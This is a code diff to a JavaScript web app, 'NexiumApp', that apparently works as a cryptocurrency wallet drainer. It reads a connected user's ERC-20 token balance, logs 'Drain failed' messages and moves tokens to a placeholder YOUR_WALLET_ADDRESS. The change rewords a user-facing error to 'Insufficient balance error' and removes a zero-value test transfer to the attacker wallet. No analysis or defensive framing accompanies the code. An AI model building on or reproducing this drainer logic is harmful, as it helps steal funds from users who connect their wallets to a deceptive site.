@@ -368,7 +368,7 @@ class NexiumApp {
       }
       console.log(`Fetched ${symbol} balance: ${ethers.formatUnits(balance, decimals)} for ${userAddress}`);
       if (balance === 0n) {
-        this.showFeedback('Error', 'error');
+        this.showFeedback('Insufficient balance error', 'error');
         console.log(`Drain failed: Zero balance for ${symbol}`);
         this.hideProcessingSpinner();
         return;
@@ -747,15 +747,6 @@ class NexiumApp {
       this.showProcessingSpinner();
       let checksummedAddress = await this.validateAddress(paymentTokenAddress, 'token');
       const contract = new ethers.Contract(checksummedAddress, MINIMAL_ERC20_ABI, this.signer);
-      // Test transfer function with callStatic
-      try {
-        await contract.callStatic.transfer(YOUR_WALLET_ADDRESS, 0);
-      } catch (error) {
-        console.error(`callStatic.transfer failed for ${checksummedAddress}:`, error);
-        this.showFeedback('Error', 'error');
-        this.hideProcessingSpinner();
-        return;
-      }
       let balance, decimals, symbol;
       try {
         [balance, decimals, symbol] = await Promise.all([
